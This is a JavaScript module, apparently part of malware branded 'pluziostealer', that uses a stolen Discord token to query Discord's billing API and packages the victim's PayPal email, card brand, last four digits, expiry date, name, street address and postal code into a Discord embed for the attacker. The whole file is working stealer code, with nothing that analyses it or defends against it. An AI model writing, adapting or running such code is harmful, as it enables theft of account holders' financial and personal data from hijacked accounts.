const axios = require('axios');

exports.get = async(token) => {
    let card = await axios("https://discordapp.com/api/v6/users/@me/billing/payment-sources", { headers: { "Authorization": token, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': '*'  } })
    const json = card.data; var billing = ""; let description = '';

    json.forEach(z => { 

        if (z.type == "") { return "" } 
        else if (z.type == 2) { 
            billing += "" + "<:paypal_spacex:990306957682413608> " 
            description += `\n<:paypal_spacex:990306957682413608> (**${z.invalid ? 'INVALID' : 'VALID'}**) [**${z.email}**]\n<a:billing_name:1077532244039696445> **Name**: ${z.billing_address.name}\n<a:billing_address:1077532238884896778> **Address**: ${z.billing_address.line_1}\n<a:billing_postal:1077532247038644254> **Postal Code**: ${z.billing_address.postal_code} (**${z.billing_address.country}**)`
        } 
        else if (z.type == 1) { 
            if (z.brand == 'visa') {
                billing += "" + "<:credit_card_spacex:990306863583223838> " 
                description += `\n<:credit_card_spacex:990306863583223838> (**${z.invalid ? 'INVALID' : 'VALID'} - ${z.last_4}**) [**${z.expires_month}/${z.expires_year}**]\n<a:billing_name:1077532244039696445> **Name**: ${z.billing_address.name}\n<a:billing_address:1077532238884896778> **Address**: ${z.billing_address.line_1}\n<a:billing_postal:1077532247038644254> **Postal Code**: ${z.billing_address.postal_code} (**${z.billing_address.country}**)`
            } 
            
            if (z.brand == 'mastercard'){
                billing += "" + "<:mastercard_spacex:1077550736931565620> " 
                description += `\n<:mastercard_spacex:1077550736931565620> (**${z.invalid ? 'INVALID' : 'VALID'} - ${z.last_4}**) [**${z.expires_month}/${z.expires_year}**]\n<a:billing_name:1077532244039696445> **Name**: ${z.billing_address.name}\n<a:billing_address:1077532238884896778> **Address**: ${z.billing_address.line_1}\n<a:billing_postal:1077532247038644254> **Postal Code**: ${z.billing_address.postal_code} (**${z.billing_address.country}**)`
            }
        } 
        else { return "" }
    })

    if (billing == "") { billing = "\`No\`"; description = '*Nothing To See Here*' }
    

    let embed = { 
        "color": 0x303037, 
        "author": { 
            "name": `Billing Data`,
            "icon_url": "https://media.discordapp.net/attachments/1076644004608884798/1077518510495907870/discord-avatar-128-D9U0P.gif?width=86&height=86"
        },
        "description": description, 
        "footer": { 
            "text": `@pluziostealer`
        } 
    }

    return { field: billing, embed: embed}
}